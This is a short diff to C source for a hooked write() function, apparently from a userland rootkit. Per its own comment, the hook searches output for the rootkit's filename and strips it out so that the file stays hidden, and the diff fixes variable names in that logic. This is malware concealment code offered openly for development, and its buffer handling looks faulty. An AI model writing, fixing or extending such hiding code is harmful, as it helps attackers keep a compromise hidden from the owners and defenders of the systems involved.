@@ -44,14 +44,14 @@ ssize_t write(int fd, const void *buf, size_t bytes)
     }
 
     //see if the name of our rootkit is in the buffer
+    size_t len = strlen(FILENAME);
     char *rootkit_found = strstr(buf, FILENAME);
+    char *new_output = (char *) malloc(strlen(buf) - len);
 
     if (rootkit_found != NULL)
     {
-        size_t len = strlen(FILENAME);
-        char *new_output = (char*) malloc(strlen(buf) - len);
-        memcpy(new_output, buf, (rootkit_found - (char *) buffer));
-        memcpy(new_output + (rootkit_found - (char *) buffer), rootkit_found + len, strlen(buffer) - len);
+        memcpy(new_output, buf, (rootkit_found - (char *) buf));
+        memcpy(new_output + (rootkit_found - (char *) buf), rootkit_found + len, strlen(buf) - len);
     }
 
     ssize_t write_output = 0;
